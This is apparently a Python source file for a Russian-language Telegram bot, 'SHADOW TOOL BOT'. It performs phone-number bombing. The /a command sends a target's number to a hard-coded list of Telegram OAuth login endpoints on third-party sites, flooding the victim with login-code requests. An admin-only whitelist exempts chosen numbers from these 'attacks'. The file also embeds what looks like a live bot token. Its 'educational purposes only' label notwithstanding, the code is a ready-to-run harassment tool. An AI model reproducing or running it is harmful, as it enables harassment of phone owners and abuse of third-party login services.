import telebot
import requests
import time
import json
import os

# ========== КОНФИГ ==========
BOT_TOKEN = '8768938960:AAGe5Pwh32P13XbwzXj7fzl5DVhYJLEIj0w'
ADMIN_ID = 8434489753  # твой Telegram ID

bot = telebot.TeleBot(BOT_TOKEN)
WHITELIST_FILE = 'whitelist.json'

ATTACK_URLS = [
    'https://oauth.telegram.org/auth/request?bot_id=1852523856&origin=https%3A%2F%2Fcabinet.presscode.app&embed=1',
    'https://translations.telegram.org/auth/request',
    'https://oauth.telegram.org/auth/request?bot_id=1093384146&origin=https%3A%2F%2Foff-bot.ru&embed=1',
    'https://oauth.telegram.org/auth/request?bot_id=466141824&origin=https%3A%2F%2Fmipped.com&embed=1',
    'https://oauth.telegram.org/auth/request?bot_id=5463728243&origin=https%3A%2F%2Fwww.spot.uz',
    'https://oauth.telegram.org/auth/request?bot_id=1733143901&origin=https%3A%2F%2Ftbiz.pro&embed=1',
    'https://oauth.telegram.org/auth/request?bot_id=319709511&origin=https%3A%2F%2Ftelegrambot.biz&embed=1',
    'https://oauth.telegram.org/auth/request?bot_id=1199558236&origin=https%3A%2F%2Fbot-t.com&embed=1',
    'https://oauth.telegram.org/auth/request?bot_id=1803424014&origin=https%3A%2F%2Fru.telegram-store.com&embed=1',
    'https://oauth.telegram.org/auth/request?bot_id=210944655&origin=https%3A%2F%2Fcombot.org&embed=1'
]

def load_whitelist():
    if os.path.exists(WHITELIST_FILE):
        with open(WHITELIST_FILE, 'r') as f:
            return json.load(f)
    return []

def save_whitelist(wl):
    with open(WHITELIST_FILE, 'w') as f:
        json.dump(wl, f, indent=2)

whitelist = load_whitelist()

def normalize_phone(phone):
    clean = ''.join(filter(str.isdigit, phone))
    if clean.startswith('8'):
        clean = '7' + clean[1:]
    if len(clean) == 10:
        clean = '7' + clean
    if not clean.startswith('+'):
        clean = '+' + clean
    return clean

def is_admin(user_id):
    return user_id == ADMIN_ID

# ========== КОМАНДЫ ДЛЯ ВСЕХ ==========

@bot.message_handler(commands=['start'])
def start(message):
    bot.reply_to(message,
        "🔮 SHADOW TOOL BOT 🔮\n\n"
        "📌 ДОСТУПНЫЕ КОМАНДЫ:\n"
        "/a +79001234567 - начать атаку\n"
        "/help - помощь\n\n"
        "⚠️ Только для образовательных целей!\n\n"
        "👑 По вопросам: @fallsfack")

@bot.message_handler(commands=['help'])
def help_cmd(message):
    bot.reply_to(message,
        "📖 ИНСТРУКЦИЯ:\n\n"
        "1. Отправь команду: /a +79001234567\n"
        "2. Бот начнёт атаку\n"
        "3. О результате напишет в чат\n\n"
        "⚠️ Только для образовательных целей!")

# Атака
@bot.message_handler(commands=['a'])
def attack(message):
    try:
        phone = message.text.split()[1]
        normalized = normalize_phone(phone)
        
        # Проверка белого списка
        if normalized in whitelist:
            bot.reply_to(message, f"⛔ АТАКА ОТМЕНЕНА!\nНомер {normalized} в белом списке!")
            return
        
        msg = bot.reply_to(message, f"🔥 АТАКА НА {normalized}...\n0/{len(ATTACK_URLS)}")
        
        sent = 0
        for i, url in enumerate(ATTACK_URLS):
            try:
                requests.post(url, data={'phone': normalized}, timeout=5)
                sent += 1
            except:
                sent += 1
            bot.edit_message_text(f"🔥 АТАКА НА {normalized}...\n{sent}/{len(ATTACK_URLS)}", 
                                  message.chat.id, msg.message_id)
            time.sleep(0.3)
        
        bot.edit_message_text(f"🎯 АТАКА ЗАВЕРШЕНА!\nОтправлено: {sent}/{len(ATTACK_URLS)}\nНомер: {normalized}", 
                              message.chat.id, msg.message_id)
        
    except IndexError:
        bot.reply_to(message, "❌ Используй: /a +79001234567")
    except Exception as e:
        bot.reply_to(message, f"❌ Ошибка: {str(e)}")

# ========== АДМИН-КОМАНДЫ (ТОЛЬКО ДЛЯ ТЕБЯ) ==========

@bot.message_handler(commands=['admin'])
def admin_panel(message):
    if not is_admin(message.from_user.id):
        return
    
    keyboard = telebot.types.InlineKeyboardMarkup()
    keyboard.row(
        telebot.types.InlineKeyboardButton("📋 Список", callback_data="admin_list"),
        telebot.types.InlineKeyboardButton("➕ Добавить", callback_data="admin_add")
    )
    keyboard.row(
        telebot.types.InlineKeyboardButton("❌ Удалить", callback_data="admin_remove"),
        telebot.types.InlineKeyboardButton("📊 Статистика", callback_data="admin_stats")
    )
    
    bot.reply_to(message, "👑 АДМИН-ПАНЕЛЬ\n\nВыбери действие:", reply_markup=keyboard)

@bot.callback_query_handler(func=lambda call: call.data.startswith('admin_'))
def admin_callback(call):
    if not is_admin(call.from_user.id):
        bot.answer_callback_query(call.id, "⛔ Доступ запрещён!")
        return
    
    action = call.data.replace('admin_', '')
    
    if action == 'list':
        if whitelist:
            phones = '\n'.join(whitelist)
            bot.send_message(call.message.chat.id, f"📋 БЕЛЫЙ СПИСОК:\n{phones}")
        else:
            bot.send_message(call.message.chat.id, "📋 Белый список пуст")
    
    elif action == 'add':
        bot.send_message(call.message.chat.id, "📝 Отправь номер для добавления:\nПример: +79001234567")
        bot.register_next_step_handler(call.message, admin_add_number)
    
    elif action == 'remove':
        bot.send_message(call.message.chat.id, "📝 Отправь номер для удаления:\nПример: +79001234567")
        bot.register_next_step_handler(call.message, admin_remove_number)
    
    elif action == 'stats':
        bot.send_message(call.message.chat.id, f"📊 СТАТИСТИКА:\n\n📋 В белом списке: {len(whitelist)} номеров")
    
    bot.answer_callback_query(call.id)

def admin_add_number(message):
    try:
        normalized = normalize_phone(message.text.strip())
        if normalized not in whitelist:
            whitelist.append(normalized)
            save_whitelist(whitelist)
            bot.reply_to(message, f"✅ Номер {normalized} добавлен в белый список!")
        else:
            bot.reply_to(message, f"⚠️ Номер {normalized} уже в белом списке!")
    except:
        bot.reply_to(message, "❌ Неверный формат! Используй: +79001234567")

def admin_remove_number(message):
    try:
        normalized = normalize_phone(message.text.strip())
        if normalized in whitelist:
            whitelist.remove(normalized)
            save_whitelist(whitelist)
            bot.reply_to(message, f"✅ Номер {normalized} удалён из белого списка!")
        else:
            bot.reply_to(message, f"⚠️ Номер {normalized} не найден!")
    except:
        bot.reply_to(message, "❌ Неверный формат! Используй: +79001234567")

@bot.message_handler(commands=['list'])
def list_cmd(message):
    if not is_admin(message.from_user.id):
        return
    if whitelist:
        bot.reply_to(message, f"📋 БЕЛЫЙ СПИСОК:\n" + '\n'.join(whitelist))
    else:
        bot.reply_to(message, "📋 Белый список пуст")

@bot.message_handler(commands=['add'])
def add_cmd(message):
    if not is_admin(message.from_user.id):
        return
    try:
        phone = message.text.split()[1]
        normalized = normalize_phone(phone)
        if normalized not in whitelist:
            whitelist.append(normalized)
            save_whitelist(whitelist)
            bot.reply_to(message, f"✅ {normalized} добавлен в белый список!")
        else:
            bot.reply_to(message, f"⚠️ {normalized} уже в списке!")
    except:
        bot.reply_to(message, "❌ /add +79001234567")

@bot.message_handler(commands=['del'])
def del_cmd(message):
    if not is_admin(message.from_user.id):
        return
    try:
        phone = message.text.split()[1]
        normalized = normalize_phone(phone)
        if normalized in whitelist:
            whitelist.remove(normalized)
            save_whitelist(whitelist)
            bot.reply_to(message, f"✅ {normalized} удалён из белого списка!")
        else:
            bot.reply_to(message, f"⚠️ {normalized} не найден!")
    except:
        bot.reply_to(message, "❌ /del +79001234567")

@bot.message_handler(commands=['stats'])
def stats_cmd(message):
    if not is_admin(message.from_user.id):
        return
    bot.reply_to(message, f"📊 СТАТИСТИКА:\n\n📋 В белом списке: {len(whitelist)} номеров")

print("🤖 Бот запущен!")
print(f"👑 Админ ID: {ADMIN_ID}")
bot.infinity_polling()
